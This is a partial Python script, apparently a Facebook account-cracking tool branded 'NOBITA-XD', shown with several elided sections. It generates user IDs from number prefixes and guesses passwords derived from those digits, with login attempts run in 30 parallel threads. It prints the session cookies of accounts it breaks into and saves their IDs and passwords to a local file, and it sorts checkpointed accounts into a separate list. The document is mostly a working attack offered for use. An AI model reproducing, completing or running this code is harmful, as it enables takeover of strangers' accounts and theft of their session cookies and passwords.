...
logo = ("""\033[1;90m\033[1;92m _      ____  ____  _  _____  ____   
 '\033[1;91m'/ \  /|/  _ \/  __\/ \/__ '\033[1;97m'__\/  _ \  
'\033[1;33m'| |\ ||| / \|| | //| |  / \  | / \|  
'\033[1;34m'| | \||| \_/|| |_\\| |  | |  | |-||  
'\033[1;35m'\_/  \|\____/\____/\_/  \_/  \_/ \| \033[1;90m
[1;92m\033[1;90m########################################\033[1;92m[1;92m
[1;92m\033[1;91m[>] [1;96mDEVOLPER\033[1;92m----\033[1;96mNOBITA-XD [1;92m        
[1;92m\033[1;91m[>] [1;92mFACEBOOK\033[1;96m----\033[1;92m/ITS NOBITA-XD [1;92m     
[1;92m\033[1;91m[>] [1;93mGITHUB\033[1;92m----\033[1;93mNOBITA-XD[1;92m         
...
def Main():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            uid = code+love
            pwx = [love[2:]]
            asha.submit(NOBITA,uid,pwx,tl)
    print('-------------------')
    print(' [~] WORK IS DONE BABE')
    print(' [+] Ids saved in NOBITA-OK.txt,-CP.txt')
    print('-------------------')
def NOBITA(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;90m[\033[1;92mNOBITA-XD\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': max}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print(f"\x1b[1;32m[NOBITA-]  {cid} - {ps}          ")
                print(f"\033[1;91m[>]\033[1;92m=COOKIES : \033[1;96m{coki}")
                open('/sdcard/NOBITA-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[1;30m[NOBITA-CP] {uid} | {ps}   ")
